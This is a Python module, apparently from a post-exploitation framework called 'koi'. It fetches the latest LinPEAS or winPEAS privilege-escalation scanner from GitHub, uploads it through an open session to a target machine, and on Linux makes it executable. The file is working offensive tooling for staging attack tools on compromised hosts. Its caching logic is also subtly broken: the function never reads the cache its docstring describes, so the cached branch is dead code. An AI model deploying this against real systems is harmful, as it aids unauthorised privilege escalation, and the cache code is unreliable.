from __future__ import annotations

import shlex
import urllib.request

from koi.modules.blueprint import KoiModule
from koi.utils.cache import cache_path, get_cache, has_cache, put_cache

LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
WINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"


class PeasModule(KoiModule):
    name = "peas"
    description = "Fetch the latest LinPEAS/winPEAS release and upload it to the target"
    usage = "peas <id> [-o <remote_path>]"
    category = "Privilege Escalation"
    platform = ["linux", "windows_ps"]
    arguments = [
        {"flags": ["-o", "--output"], "default": None, "help": "Remote destination path"},
    ]

    def _fetch_tool(self, url: str, cache_name: str) -> tuple[bytes, str]:
        """Return *cache_name* from the local cache, downloading it from *url* if absent."""
        with urllib.request.urlopen(url, timeout=60) as resp:
            data = resp.read()
        if not has_cache(cache_name):
            put_cache(cache_name, data)
        return data, "remote"

    def run(self) -> None:
        os_type = self.session.os_type

        if os_type == "linux":
            url, name = LINPEAS_URL, "linpeas.sh"
            dest = self.args.output or f"./{name}"
        else:
            url, name = WINPEAS_URL, "winPEASx64.exe"
            dest = self.args.output or f".\\{name}"

        with self.spinner(f"Fetching {name}..."):
            try:
                raw, source = self._fetch_tool(url, name)
            except Exception as exc:
                self.err(f"Could not fetch {name}: {exc}")
                return

        if source == "cache":
            self.ok(f"Using cached {name} ({cache_path(name)})")
        else:
            self.ok(f"{name} fetched from PEASS-ng releases and cached locally")

        total = len(raw)
        bar = self.ui.ProgressBar(total=total)
        self.status(f"Uploading {name} -> {dest} ({total} bytes)...")
        ok = self._upload_bytes(raw, dest, timeout=60, on_progress=bar.update)
        bar.done()
        print()

        if not ok:
            self.err("Transfer failed.")
            return

        if os_type == "linux":
            self.exec(f"chmod +x {shlex.quote(dest)}")

        self.box("Upload complete", {
            "tool":        name,
            "remote path": dest,
            "size":        f"{total} bytes  ({total/1024:.1f} KB)",
        })
